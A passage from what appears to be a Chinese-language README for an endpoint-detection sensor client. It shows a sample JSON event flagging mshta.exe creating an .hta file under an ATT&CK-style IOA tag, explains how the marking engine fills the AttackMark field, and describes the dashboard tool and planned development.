		"AgentID" : "5b52cfcca998b6376b1ab43fea01cdfe",
		"AttackMark" : "4d749a25-d3a3-4a48-91ab-42014baab021:23:file_create_mshta",
		"BootTime" : "2024/01/03 16:42:09",
		"DriverType" : 1,
		"EventID" : 23,
		"FileClass" : 8,
		"FileClassDescription" : "script",
		"FileFormat" : 57,
		"FileFormatDescription" : "html",
		"FileMD5" : "",
		"FileName" : "c:\\users\\lxg\\appdata\\local\\microsoft\\windows\\inetcache\\ie\\2dyz6iv1\\t1218.005[1].hta",
		"ProcessGUID" : "4d2a7f5d18e81930007afd32253eda01",
		"ProcessID" : 6448,
		"ProcessImage" : "c:\\windows\\system32\\mshta.exe",
		"ProcessMD5" : "98447a7f26ee9dac6b806924d6e21c90",
		"ProcessName" : "mshta.exe",
		"SignVendor" : "",
		"Signature" : 0,
		"Time" : "2024/01/03 17:14:49",
		"UniqueID" : "bf478699-cce9-44f7-8acd-606aecd5de9d",
		"id" : 4
	}
]
```

例如：采集引擎会将数据送入标记引擎，会完成数据IOA标记，数据标记完，存在于AttackMark字段，可以去读取数据内容

## Client DashBoard

Client为大家准备了DashBoard，用于观测产生的探针数据，DashBoard工具路径：

`C:\Program Files\SensorEdr\frametool.exe` 双击运行，界面如下，打开工具后，在界面刷新：

![](https://github.com/lxg2021/Sensor-Client/blob/main/png/dashboard.png)

左侧：模块功能接口，Attck IOA测试用例

底侧：探针数据，双击探针数据，就可以在中控面板中看到详细内容

右侧：目前的插件列表

组件功能接口及安全能力用例暂不会发布

## 后续计划

- 完成剩余Attck IOA整合
- 完成Client动态处置模型
- 优化后台分析，关联，钻探，语义模型，后台优化完成也会陆续发布
- 开始前端建设
